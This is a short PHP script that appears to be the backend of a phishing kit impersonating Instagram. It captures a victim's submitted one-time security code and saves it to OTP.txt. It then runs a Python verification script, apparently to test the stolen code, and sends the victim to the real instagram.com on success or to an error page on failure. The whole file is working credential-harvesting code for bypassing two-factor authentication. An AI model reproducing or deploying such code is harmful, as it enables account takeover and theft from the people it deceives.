<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") 
{
    $name = $_POST["SecurityCode"];
    $myfile = fopen("OTP.txt", "w");
    fwrite($myfile, $name);
    fclose($myfile);
    $cmd ="python checkforverification.py"; 
    $output = exec($cmd);

    if ($output == "Success") {
        header('Location: https://instagram.com');
    }
    if($output == "Error") {
        header('Location:OTPError.html');
 
    }
}
?>